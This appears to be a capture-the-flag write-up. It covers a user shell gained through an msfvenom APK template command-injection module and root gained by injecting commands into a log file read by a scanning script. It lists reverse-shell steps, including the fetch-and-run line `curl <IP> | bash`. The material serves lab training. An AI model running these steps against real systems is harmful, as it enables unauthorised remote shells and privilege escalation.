## user flag

### nmap

### web

we are greeted with a hand-made webpage that let you execute some commands  
![](./images/image2.png)  

you can execute `searchsploit`, `nmap` and `msfvenom` and choose some of its values  
i try a little bit of command injection but i can't  

the "template file" on the "msfvenom" part caught my eye  
i google it, and while doing it, google auto-fills with "msfvenom template exploit"  
seems like in some versions of msfvenom, you cand use a malicious ".apk" as template file for android  
that allows you to execute commands  

i discover the module *exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection*  
this module creates an ".apk" that makes the target send a reverse shell to the selected IP and PORT  
we setup a **netcat listener** and choose "os=android" and our file as template file on the website

we click "generate"... and voil√° !! we have a reverse shell as "kid" and user.txt !!!

## root flag

it seems like */home/pwn/scanlosers.sh* is an interesting file  
![](./images/image4.png)  

it looks like its reading every line of */home/kid/logs/hackers*  
it's cutting the line in blank spaces and selecting the 3rd element to use it as IP in nmap  
with a little bit of try an error, looks like its executing right after modifying the file *hackers*  
i believe this has to be vulnerable to command injection  

### exploiting the script

first, as proof of concept, im gonna curl a netcat listener  
![](./images/image5.png)  

i use double quotes so the command "cut" doesn't apply to the payload, and backsticks to execute an additional command  
lets save the file...  
![](./images/image6.png)  
it works !!!!

so now you can get a reverse shell as *pwn*  
there are a lot of techniques to choose  
my favorite one goes as follows :
* create a bash script with a reverse shell payload directed to your machine on a chosen port named "index.html"
* start a http server on the same location as the script
* start a netcat listener on the chosen port
* inject the following command : `curl <IP> | bash`
* you should have a reverse shell

### from "pwn" to "root"  

this one is pretty trivial

after using Metasploit with sudo privileges, we can directly execute system commands on the metasploit shell
